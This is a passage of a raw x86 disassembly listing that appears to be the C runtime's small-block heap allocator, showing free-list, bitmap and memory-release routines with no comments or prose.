  406a76:	2b 50 0c             	sub    0xc(%eax),%edx
  406a79:	81 fa 00 00 10 00    	cmp    $0x100000,%edx
  406a7f:	72 07                	jb     0x406a88
  406a81:	83 c0 14             	add    $0x14,%eax
  406a84:	eb e8                	jmp    0x406a6e
  406a86:	33 c0                	xor    %eax,%eax
  406a88:	c3                   	ret
  406a89:	55                   	push   %ebp
  406a8a:	8b ec                	mov    %esp,%ebp
  406a8c:	83 ec 14             	sub    $0x14,%esp
  406a8f:	8b 55 0c             	mov    0xc(%ebp),%edx
  406a92:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406a95:	53                   	push   %ebx
  406a96:	56                   	push   %esi
  406a97:	8b 41 10             	mov    0x10(%ecx),%eax
  406a9a:	8b f2                	mov    %edx,%esi
  406a9c:	2b 71 0c             	sub    0xc(%ecx),%esi
  406a9f:	8b 5a fc             	mov    -0x4(%edx),%ebx
  406aa2:	83 c2 fc             	add    $0xfffffffc,%edx
  406aa5:	57                   	push   %edi
  406aa6:	c1 ee 0f             	shr    $0xf,%esi
  406aa9:	8b ce                	mov    %esi,%ecx
  406aab:	8b 7a fc             	mov    -0x4(%edx),%edi
  406aae:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  406ab4:	4b                   	dec    %ebx
  406ab5:	89 7d fc             	mov    %edi,-0x4(%ebp)
  406ab8:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  406abf:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  406ac2:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406ac5:	8b 0c 13             	mov    (%ebx,%edx,1),%ecx
  406ac8:	f6 c1 01             	test   $0x1,%cl
  406acb:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406ace:	75 7f                	jne    0x406b4f
  406ad0:	c1 f9 04             	sar    $0x4,%ecx
  406ad3:	6a 3f                	push   $0x3f
  406ad5:	49                   	dec    %ecx
  406ad6:	5f                   	pop    %edi
  406ad7:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  406ada:	3b cf                	cmp    %edi,%ecx
  406adc:	76 03                	jbe    0x406ae1
  406ade:	89 7d 0c             	mov    %edi,0xc(%ebp)
  406ae1:	8b 4c 13 04          	mov    0x4(%ebx,%edx,1),%ecx
  406ae5:	3b 4c 13 08          	cmp    0x8(%ebx,%edx,1),%ecx
  406ae9:	75 48                	jne    0x406b33
  406aeb:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406aee:	83 f9 20             	cmp    $0x20,%ecx
  406af1:	73 1c                	jae    0x406b0f
  406af3:	bf 00 00 00 80       	mov    $0x80000000,%edi
  406af8:	d3 ef                	shr    %cl,%edi
  406afa:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  406afe:	f7 d7                	not    %edi
  406b00:	21 7c b0 44          	and    %edi,0x44(%eax,%esi,4)
  406b04:	fe 09                	decb   (%ecx)
  406b06:	75 2b                	jne    0x406b33
  406b08:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406b0b:	21 39                	and    %edi,(%ecx)
  406b0d:	eb 24                	jmp    0x406b33
  406b0f:	83 c1 e0             	add    $0xffffffe0,%ecx
  406b12:	bf 00 00 00 80       	mov    $0x80000000,%edi
  406b17:	d3 ef                	shr    %cl,%edi
  406b19:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406b1c:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  406b20:	f7 d7                	not    %edi
  406b22:	21 bc b0 c4 00 00 00 	and    %edi,0xc4(%eax,%esi,4)
  406b29:	fe 09                	decb   (%ecx)
  406b2b:	75 06                	jne    0x406b33
  406b2d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406b30:	21 79 04             	and    %edi,0x4(%ecx)
  406b33:	8b 4c 13 08          	mov    0x8(%ebx,%edx,1),%ecx
  406b37:	8b 7c 13 04          	mov    0x4(%ebx,%edx,1),%edi
  406b3b:	89 79 04             	mov    %edi,0x4(%ecx)
  406b3e:	8b 4c 13 04          	mov    0x4(%ebx,%edx,1),%ecx
  406b42:	8b 7c 13 08          	mov    0x8(%ebx,%edx,1),%edi
  406b46:	03 5d f8             	add    -0x8(%ebp),%ebx
  406b49:	89 79 08             	mov    %edi,0x8(%ecx)
  406b4c:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  406b4f:	8b fb                	mov    %ebx,%edi
  406b51:	c1 ff 04             	sar    $0x4,%edi
  406b54:	4f                   	dec    %edi
  406b55:	83 ff 3f             	cmp    $0x3f,%edi
  406b58:	76 03                	jbe    0x406b5d
  406b5a:	6a 3f                	push   $0x3f
  406b5c:	5f                   	pop    %edi
  406b5d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406b60:	83 e1 01             	and    $0x1,%ecx
  406b63:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  406b66:	0f 85 a0 00 00 00    	jne    0x406c0c
  406b6c:	2b 55 fc             	sub    -0x4(%ebp),%edx
  406b6f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406b72:	c1 f9 04             	sar    $0x4,%ecx
  406b75:	6a 3f                	push   $0x3f
  406b77:	89 55 f8             	mov    %edx,-0x8(%ebp)
  406b7a:	49                   	dec    %ecx
  406b7b:	5a                   	pop    %edx
  406b7c:	3b ca                	cmp    %edx,%ecx
  406b7e:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  406b81:	76 05                	jbe    0x406b88
  406b83:	89 55 0c             	mov    %edx,0xc(%ebp)
  406b86:	8b ca                	mov    %edx,%ecx
  406b88:	03 5d fc             	add    -0x4(%ebp),%ebx
  406b8b:	8b fb                	mov    %ebx,%edi
  406b8d:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  406b90:	c1 ff 04             	sar    $0x4,%edi
  406b93:	4f                   	dec    %edi
  406b94:	3b fa                	cmp    %edx,%edi
  406b96:	76 02                	jbe    0x406b9a
  406b98:	8b fa                	mov    %edx,%edi
  406b9a:	3b cf                	cmp    %edi,%ecx
  406b9c:	74 6b                	je     0x406c09
  406b9e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406ba1:	8b 51 04             	mov    0x4(%ecx),%edx
  406ba4:	3b 51 08             	cmp    0x8(%ecx),%edx
  406ba7:	75 48                	jne    0x406bf1
  406ba9:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406bac:	83 f9 20             	cmp    $0x20,%ecx
  406baf:	73 1c                	jae    0x406bcd
  406bb1:	ba 00 00 00 80       	mov    $0x80000000,%edx
  406bb6:	d3 ea                	shr    %cl,%edx
  406bb8:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  406bbc:	f7 d2                	not    %edx
  406bbe:	21 54 b0 44          	and    %edx,0x44(%eax,%esi,4)
  406bc2:	fe 09                	decb   (%ecx)
  406bc4:	75 2b                	jne    0x406bf1
  406bc6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406bc9:	21 11                	and    %edx,(%ecx)
  406bcb:	eb 24                	jmp    0x406bf1
  406bcd:	83 c1 e0             	add    $0xffffffe0,%ecx
  406bd0:	ba 00 00 00 80       	mov    $0x80000000,%edx
  406bd5:	d3 ea                	shr    %cl,%edx
  406bd7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406bda:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  406bde:	f7 d2                	not    %edx
  406be0:	21 94 b0 c4 00 00 00 	and    %edx,0xc4(%eax,%esi,4)
  406be7:	fe 09                	decb   (%ecx)
  406be9:	75 06                	jne    0x406bf1
  406beb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406bee:	21 51 04             	and    %edx,0x4(%ecx)
  406bf1:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406bf4:	8b 51 08             	mov    0x8(%ecx),%edx
  406bf7:	8b 49 04             	mov    0x4(%ecx),%ecx
  406bfa:	89 4a 04             	mov    %ecx,0x4(%edx)
  406bfd:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406c00:	8b 51 04             	mov    0x4(%ecx),%edx
  406c03:	8b 49 08             	mov    0x8(%ecx),%ecx
  406c06:	89 4a 08             	mov    %ecx,0x8(%edx)
  406c09:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406c0c:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  406c10:	75 09                	jne    0x406c1b
  406c12:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  406c15:	0f 84 89 00 00 00    	je     0x406ca4
  406c1b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406c1e:	8d 0c f9             	lea    (%ecx,%edi,8),%ecx
  406c21:	8b 49 04             	mov    0x4(%ecx),%ecx
  406c24:	89 4a 04             	mov    %ecx,0x4(%edx)
  406c27:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406c2a:	8d 0c f9             	lea    (%ecx,%edi,8),%ecx
  406c2d:	89 4a 08             	mov    %ecx,0x8(%edx)
  406c30:	89 51 04             	mov    %edx,0x4(%ecx)
  406c33:	8b 4a 04             	mov    0x4(%edx),%ecx
  406c36:	89 51 08             	mov    %edx,0x8(%ecx)
  406c39:	8b 4a 04             	mov    0x4(%edx),%ecx
  406c3c:	3b 4a 08             	cmp    0x8(%edx),%ecx
  406c3f:	75 63                	jne    0x406ca4
  406c41:	8a 4c 07 04          	mov    0x4(%edi,%eax,1),%cl
  406c45:	83 ff 20             	cmp    $0x20,%edi
  406c48:	88 4d 0f             	mov    %cl,0xf(%ebp)
  406c4b:	fe c1                	inc    %cl
  406c4d:	88 4c 07 04          	mov    %cl,0x4(%edi,%eax,1)
  406c51:	73 25                	jae    0x406c78
  406c53:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  406c57:	75 0e                	jne    0x406c67
  406c59:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406c5e:	8b cf                	mov    %edi,%ecx
  406c60:	d3 eb                	shr    %cl,%ebx
  406c62:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406c65:	09 19                	or     %ebx,(%ecx)
  406c67:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406c6c:	8b cf                	mov    %edi,%ecx
  406c6e:	d3 eb                	shr    %cl,%ebx
  406c70:	8d 44 b0 44          	lea    0x44(%eax,%esi,4),%eax
  406c74:	09 18                	or     %ebx,(%eax)
  406c76:	eb 29                	jmp    0x406ca1
  406c78:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  406c7c:	75 10                	jne    0x406c8e
  406c7e:	8d 4f e0             	lea    -0x20(%edi),%ecx
  406c81:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406c86:	d3 eb                	shr    %cl,%ebx
  406c88:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406c8b:	09 59 04             	or     %ebx,0x4(%ecx)
  406c8e:	8d 4f e0             	lea    -0x20(%edi),%ecx
  406c91:	bf 00 00 00 80       	mov    $0x80000000,%edi
  406c96:	d3 ef                	shr    %cl,%edi
  406c98:	8d 84 b0 c4 00 00 00 	lea    0xc4(%eax,%esi,4),%eax
  406c9f:	09 38                	or     %edi,(%eax)
  406ca1:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  406ca4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406ca7:	89 1a                	mov    %ebx,(%edx)
  406ca9:	89 5c 13 fc          	mov    %ebx,-0x4(%ebx,%edx,1)
  406cad:	ff 08                	decl   (%eax)
  406caf:	0f 85 fa 00 00 00    	jne    0x406daf
  406cb5:	a1 d4 c3 40 00       	mov    0x40c3d4,%eax
  406cba:	85 c0                	test   %eax,%eax
  406cbc:	0f 84 df 00 00 00    	je     0x406da1
  406cc2:	8b 0d cc c3 40 00    	mov    0x40c3cc,%ecx
  406cc8:	8b 3d c4 90 40 00    	mov    0x4090c4,%edi
  406cce:	c1 e1 0f             	shl    $0xf,%ecx
  406cd1:	03 48 0c             	add    0xc(%eax),%ecx
  406cd4:	bb 00 80 00 00       	mov    $0x8000,%ebx
  406cd9:	68 00 40 00 00       	push   $0x4000
  406cde:	53                   	push   %ebx
  406cdf:	51                   	push   %ecx
  406ce0:	ff d7                	call   *%edi
  406ce2:	8b 0d cc c3 40 00    	mov    0x40c3cc,%ecx
  406ce8:	a1 d4 c3 40 00       	mov    0x40c3d4,%eax
  406ced:	ba 00 00 00 80       	mov    $0x80000000,%edx
  406cf2:	d3 ea                	shr    %cl,%edx
  406cf4:	09 50 08             	or     %edx,0x8(%eax)
  406cf7:	a1 d4 c3 40 00       	mov    0x40c3d4,%eax
  406cfc:	8b 0d cc c3 40 00    	mov    0x40c3cc,%ecx
  406d02:	8b 40 10             	mov    0x10(%eax),%eax
  406d05:	83 a4 88 c4 00 00 00 	andl   $0x0,0xc4(%eax,%ecx,4)
  406d0c:	00 
  406d0d:	a1 d4 c3 40 00       	mov    0x40c3d4,%eax
  406d12:	8b 40 10             	mov    0x10(%eax),%eax
  406d15:	fe 48 43             	decb   0x43(%eax)
  406d18:	a1 d4 c3 40 00       	mov    0x40c3d4,%eax
  406d1d:	8b 48 10             	mov    0x10(%eax),%ecx
  406d20:	80 79 43 00          	cmpb   $0x0,0x43(%ecx)
  406d24:	75 09                	jne    0x406d2f
  406d26:	83 60 04 fe          	andl   $0xfffffffe,0x4(%eax)
  406d2a:	a1 d4 c3 40 00       	mov    0x40c3d4,%eax
  406d2f:	83 78 08 ff          	cmpl   $0xffffffff,0x8(%eax)
  406d33:	75 6c                	jne    0x406da1
  406d35:	53                   	push   %ebx
  406d36:	6a 00                	push   $0x0
  406d38:	ff 70 0c             	push   0xc(%eax)
  406d3b:	ff d7                	call   *%edi
  406d3d:	a1 d4 c3 40 00       	mov    0x40c3d4,%eax
  406d42:	ff 70 10             	push   0x10(%eax)
  406d45:	6a 00                	push   $0x0
  406d47:	ff 35 e0 c3 40 00    	push   0x40c3e0
  406d4d:	ff 15 94 90 40 00    	call   *0x409094
  406d53:	a1 d8 c3 40 00       	mov    0x40c3d8,%eax
  406d58:	8b 15 dc c3 40 00    	mov    0x40c3dc,%edx
  406d5e:	8d 04 80             	lea    (%eax,%eax,4),%eax
  406d61:	c1 e0 02             	shl    $0x2,%eax
  406d64:	8b c8                	mov    %eax,%ecx
  406d66:	a1 d4 c3 40 00       	mov    0x40c3d4,%eax
  406d6b:	2b c8                	sub    %eax,%ecx
  406d6d:	8d 4c 11 ec          	lea    -0x14(%ecx,%edx,1),%ecx
  406d71:	51                   	push   %ecx
  406d72:	8d 48 14             	lea    0x14(%eax),%ecx
  406d75:	51                   	push   %ecx
  406d76:	50                   	push   %eax
  406d77:	e8 f4 d7 ff ff       	call   0x404570
  406d7c:	8b 45 08             	mov    0x8(%ebp),%eax
  406d7f:	83 c4 0c             	add    $0xc,%esp
  406d82:	ff 0d d8 c3 40 00    	decl   0x40c3d8
  406d88:	3b 05 d4 c3 40 00    	cmp    0x40c3d4,%eax
  406d8e:	76 03                	jbe    0x406d93
  406d90:	83 e8 14             	sub    $0x14,%eax
  406d93:	8b 0d dc c3 40 00    	mov    0x40c3dc,%ecx
  406d99:	89 0d d0 c3 40 00    	mov    %ecx,0x40c3d0
  406d9f:	eb 03                	jmp    0x406da4
  406da1:	8b 45 08             	mov    0x8(%ebp),%eax
  406da4:	a3 d4 c3 40 00       	mov    %eax,0x40c3d4
  406da9:	89 35 cc c3 40 00    	mov    %esi,0x40c3cc
  406daf:	5f                   	pop    %edi
  406db0:	5e                   	pop    %esi
  406db1:	5b                   	pop    %ebx
  406db2:	c9                   	leave
  406db3:	c3                   	ret
  406db4:	55                   	push   %ebp
  406db5:	8b ec                	mov    %esp,%ebp
  406db7:	83 ec 14             	sub    $0x14,%esp
  406dba:	a1 d8 c3 40 00       	mov    0x40c3d8,%eax
  406dbf:	8b 15 dc c3 40 00    	mov    0x40c3dc,%edx
  406dc5:	53                   	push   %ebx
  406dc6:	56                   	push   %esi
  406dc7:	8d 04 80             	lea    (%eax,%eax,4),%eax
  406dca:	57                   	push   %edi
  406dcb:	8d 3c 82             	lea    (%edx,%eax,4),%edi
  406dce:	8b 45 08             	mov    0x8(%ebp),%eax
  406dd1:	89 7d fc             	mov    %edi,-0x4(%ebp)
  406dd4:	8d 48 17             	lea    0x17(%eax),%ecx
  406dd7:	83 e1 f0             	and    $0xfffffff0,%ecx
  406dda:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406ddd:	c1 f9 04             	sar    $0x4,%ecx
  406de0:	49                   	dec    %ecx
  406de1:	83 f9 20             	cmp    $0x20,%ecx
  406de4:	7d 0e                	jge    0x406df4
  406de6:	83 ce ff             	or     $0xffffffff,%esi
  406de9:	d3 ee                	shr    %cl,%esi
  406deb:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  406def:	89 75 f4             	mov    %esi,-0xc(%ebp)
  406df2:	eb 10                	jmp    0x406e04
  406df4:	83 c1 e0             	add    $0xffffffe0,%ecx
  406df7:	83 c8 ff             	or     $0xffffffff,%eax
  406dfa:	33 f6                	xor    %esi,%esi
  406dfc:	d3 e8                	shr    %cl,%eax
  406dfe:	89 75 f4             	mov    %esi,-0xc(%ebp)
  406e01:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406e04:	a1 d0 c3 40 00       	mov    0x40c3d0,%eax
  406e09:	8b d8                	mov    %eax,%ebx
  406e0b:	3b df                	cmp    %edi,%ebx
  406e0d:	89 5d 08             	mov    %ebx,0x8(%ebp)
  406e10:	73 19                	jae    0x406e2b
  406e12:	8b 4b 04             	mov    0x4(%ebx),%ecx
  406e15:	8b 3b                	mov    (%ebx),%edi
  406e17:	23 4d f8             	and    -0x8(%ebp),%ecx
  406e1a:	23 fe                	and    %esi,%edi
  406e1c:	0b cf                	or     %edi,%ecx
  406e1e:	75 0b                	jne    0x406e2b
  406e20:	83 c3 14             	add    $0x14,%ebx
  406e23:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  406e26:	89 5d 08             	mov    %ebx,0x8(%ebp)
  406e29:	72 e7                	jb     0x406e12
  406e2b:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  406e2e:	75 79                	jne    0x406ea9
  406e30:	8b da                	mov    %edx,%ebx
  406e32:	3b d8                	cmp    %eax,%ebx
  406e34:	89 5d 08             	mov    %ebx,0x8(%ebp)
  406e37:	73 15                	jae    0x406e4e
  406e39:	8b 4b 04             	mov    0x4(%ebx),%ecx
  406e3c:	8b 3b                	mov    (%ebx),%edi
  406e3e:	23 4d f8             	and    -0x8(%ebp),%ecx
  406e41:	23 fe                	and    %esi,%edi
  406e43:	0b cf                	or     %edi,%ecx
  406e45:	75 05                	jne    0x406e4c
  406e47:	83 c3 14             	add    $0x14,%ebx
  406e4a:	eb e6                	jmp    0x406e32
  406e4c:	3b d8                	cmp    %eax,%ebx
  406e4e:	75 59                	jne    0x406ea9
  406e50:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  406e53:	73 11                	jae    0x406e66
  406e55:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  406e59:	75 08                	jne    0x406e63
  406e5b:	83 c3 14             	add    $0x14,%ebx
  406e5e:	89 5d 08             	mov    %ebx,0x8(%ebp)
  406e61:	eb ed                	jmp    0x406e50
  406e63:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  406e66:	75 26                	jne    0x406e8e
  406e68:	8b da                	mov    %edx,%ebx
  406e6a:	3b d8                	cmp    %eax,%ebx
  406e6c:	89 5d 08             	mov    %ebx,0x8(%ebp)
  406e6f:	73 0d                	jae    0x406e7e
  406e71:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  406e75:	75 05                	jne    0x406e7c
  406e77:	83 c3 14             	add    $0x14,%ebx
  406e7a:	eb ee                	jmp    0x406e6a
  406e7c:	3b d8                	cmp    %eax,%ebx
  406e7e:	75 0e                	jne    0x406e8e
  406e80:	e8 38 02 00 00       	call   0x4070bd
  406e85:	8b d8                	mov    %eax,%ebx
  406e87:	85 db                	test   %ebx,%ebx
  406e89:	89 5d 08             	mov    %ebx,0x8(%ebp)
  406e8c:	74 14                	je     0x406ea2
  406e8e:	53                   	push   %ebx
  406e8f:	e8 da 02 00 00       	call   0x40716e
  406e94:	59                   	pop    %ecx
  406e95:	8b 4b 10             	mov    0x10(%ebx),%ecx
  406e98:	89 01                	mov    %eax,(%ecx)
  406e9a:	8b 43 10             	mov    0x10(%ebx),%eax
  406e9d:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  406ea0:	75 07                	jne    0x406ea9
  406ea2:	33 c0                	xor    %eax,%eax
  406ea4:	e9 0f 02 00 00       	jmp    0x4070b8
  406ea9:	89 1d d0 c3 40 00    	mov    %ebx,0x40c3d0
  406eaf:	8b 43 10             	mov    0x10(%ebx),%eax
  406eb2:	8b 10                	mov    (%eax),%edx
  406eb4:	83 fa ff             	cmp    $0xffffffff,%edx
  406eb7:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406eba:	74 14                	je     0x406ed0
  406ebc:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  406ec3:	8b 7c 90 44          	mov    0x44(%eax,%edx,4),%edi
  406ec7:	23 4d f8             	and    -0x8(%ebp),%ecx
  406eca:	23 fe                	and    %esi,%edi
  406ecc:	0b cf                	or     %edi,%ecx
  406ece:	75 37                	jne    0x406f07
  406ed0:	8b 90 c4 00 00 00    	mov    0xc4(%eax),%edx
  406ed6:	8b 70 44             	mov    0x44(%eax),%esi
  406ed9:	23 55 f8             	and    -0x8(%ebp),%edx
  406edc:	23 75 f4             	and    -0xc(%ebp),%esi
  406edf:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406ee3:	8d 48 44             	lea    0x44(%eax),%ecx
  406ee6:	0b d6                	or     %esi,%edx
  406ee8:	8b 75 f4             	mov    -0xc(%ebp),%esi
  406eeb:	75 17                	jne    0x406f04
  406eed:	8b 91 84 00 00 00    	mov    0x84(%ecx),%edx
  406ef3:	ff 45 fc             	incl   -0x4(%ebp)
  406ef6:	23 55 f8             	and    -0x8(%ebp),%edx
  406ef9:	83 c1 04             	add    $0x4,%ecx
  406efc:	8b fe                	mov    %esi,%edi
  406efe:	23 39                	and    (%ecx),%edi
  406f00:	0b d7                	or     %edi,%edx
  406f02:	74 e9                	je     0x406eed
  406f04:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406f07:	8b ca                	mov    %edx,%ecx
  406f09:	33 ff                	xor    %edi,%edi
  406f0b:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  406f11:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  406f18:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  406f1b:	8b 4c 90 44          	mov    0x44(%eax,%edx,4),%ecx
  406f1f:	23 ce                	and    %esi,%ecx
  406f21:	75 0d                	jne    0x406f30
  406f23:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  406f2a:	6a 20                	push   $0x20
  406f2c:	23 4d f8             	and    -0x8(%ebp),%ecx
  406f2f:	5f                   	pop    %edi
  406f30:	85 c9                	test   %ecx,%ecx
  406f32:	7c 05                	jl     0x406f39
  406f34:	d1 e1                	shl    $1,%ecx
  406f36:	47                   	inc    %edi
  406f37:	eb f7                	jmp    0x406f30
  406f39:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406f3c:	8b 54 f9 04          	mov    0x4(%ecx,%edi,8),%edx
  406f40:	8b 0a                	mov    (%edx),%ecx
  406f42:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  406f45:	8b f1                	mov    %ecx,%esi
  406f47:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406f4a:	c1 fe 04             	sar    $0x4,%esi
  406f4d:	4e                   	dec    %esi
  406f4e:	83 fe 3f             	cmp    $0x3f,%esi
  406f51:	7e 03                	jle    0x406f56
  406f53:	6a 3f                	push   $0x3f
  406f55:	5e                   	pop    %esi
  406f56:	3b f7                	cmp    %edi,%esi
  406f58:	0f 84 0d 01 00 00    	je     0x40706b
  406f5e:	8b 4a 04             	mov    0x4(%edx),%ecx
  406f61:	3b 4a 08             	cmp    0x8(%edx),%ecx
  406f64:	75 61                	jne    0x406fc7
  406f66:	83 ff 20             	cmp    $0x20,%edi
  406f69:	7d 2b                	jge    0x406f96
  406f6b:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406f70:	8b cf                	mov    %edi,%ecx
  406f72:	d3 eb                	shr    %cl,%ebx
  406f74:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406f77:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  406f7b:	f7 d3                	not    %ebx
  406f7d:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  406f80:	23 5c 88 44          	and    0x44(%eax,%ecx,4),%ebx
  406f84:	89 5c 88 44          	mov    %ebx,0x44(%eax,%ecx,4)
  406f88:	fe 0f                	decb   (%edi)
  406f8a:	75 38                	jne    0x406fc4
  406f8c:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406f8f:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406f92:	21 0b                	and    %ecx,(%ebx)
  406f94:	eb 31                	jmp    0x406fc7
  406f96:	8d 4f e0             	lea    -0x20(%edi),%ecx
  406f99:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406f9e:	d3 eb                	shr    %cl,%ebx
  406fa0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406fa3:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  406fa7:	8d 8c 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%ecx
  406fae:	f7 d3                	not    %ebx
  406fb0:	21 19                	and    %ebx,(%ecx)
  406fb2:	fe 0f                	decb   (%edi)
  406fb4:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  406fb7:	75 0b                	jne    0x406fc4
  406fb9:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406fbc:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406fbf:	21 4b 04             	and    %ecx,0x4(%ebx)
  406fc2:	eb 03                	jmp    0x406fc7
  406fc4:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406fc7:	8b 4a 08             	mov    0x8(%edx),%ecx
  406fca:	8b 7a 04             	mov    0x4(%edx),%edi
  406fcd:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406fd1:	89 79 04             	mov    %edi,0x4(%ecx)
  406fd4:	8b 4a 04             	mov    0x4(%edx),%ecx
  406fd7:	8b 7a 08             	mov    0x8(%edx),%edi
  406fda:	89 79 08             	mov    %edi,0x8(%ecx)
  406fdd:	0f 84 94 00 00 00    	je     0x407077
  406fe3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406fe6:	8b 7c f1 04          	mov    0x4(%ecx,%esi,8),%edi
  406fea:	8d 0c f1             	lea    (%ecx,%esi,8),%ecx
  406fed:	89 7a 04             	mov    %edi,0x4(%edx)
  406ff0:	89 4a 08             	mov    %ecx,0x8(%edx)
  406ff3:	89 51 04             	mov    %edx,0x4(%ecx)
  406ff6:	8b 4a 04             	mov    0x4(%edx),%ecx
  406ff9:	89 51 08             	mov    %edx,0x8(%ecx)
  406ffc:	8b 4a 04             	mov    0x4(%edx),%ecx
  406fff:	3b 4a 08             	cmp    0x8(%edx),%ecx
  407002:	75 64                	jne    0x407068
  407004:	8a 4c 06 04          	mov    0x4(%esi,%eax,1),%cl
  407008:	83 fe 20             	cmp    $0x20,%esi
  40700b:	88 4d 0b             	mov    %cl,0xb(%ebp)
  40700e:	7d 29                	jge    0x407039
  407010:	fe c1                	inc    %cl
  407012:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  407016:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  40701a:	75 0b                	jne    0x407027
  40701c:	bf 00 00 00 80       	mov    $0x80000000,%edi
  407021:	8b ce                	mov    %esi,%ecx
  407023:	d3 ef                	shr    %cl,%edi
  407025:	09 3b                	or     %edi,(%ebx)
  407027:	bf 00 00 00 80       	mov    $0x80000000,%edi
  40702c:	8b ce                	mov    %esi,%ecx
  40702e:	d3 ef                	shr    %cl,%edi
  407030:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407033:	09 7c 88 44          	or     %edi,0x44(%eax,%ecx,4)
  407037:	eb 2f                	jmp    0x407068
  407039:	fe c1                	inc    %cl
  40703b:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  40703f:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  407043:	75 0d                	jne    0x407052
  407045:	8d 4e e0             	lea    -0x20(%esi),%ecx
  407048:	bf 00 00 00 80       	mov    $0x80000000,%edi
  40704d:	d3 ef                	shr    %cl,%edi
  40704f:	09 7b 04             	or     %edi,0x4(%ebx)
  407052:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407055:	8d bc 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%edi
  40705c:	8d 4e e0             	lea    -0x20(%esi),%ecx
  40705f:	be 00 00 00 80       	mov    $0x80000000,%esi
  407064:	d3 ee                	shr    %cl,%esi
  407066:	09 37                	or     %esi,(%edi)
  407068:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40706b:	85 c9                	test   %ecx,%ecx
  40706d:	74 0b                	je     0x40707a
  40706f:	89 0a                	mov    %ecx,(%edx)
  407071:	89 4c 11 fc          	mov    %ecx,-0x4(%ecx,%edx,1)
  407075:	eb 03                	jmp    0x40707a
  407077:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40707a:	8b 75 f0             	mov    -0x10(%ebp),%esi
  40707d:	03 d1                	add    %ecx,%edx
  40707f:	8d 4e 01             	lea    0x1(%esi),%ecx
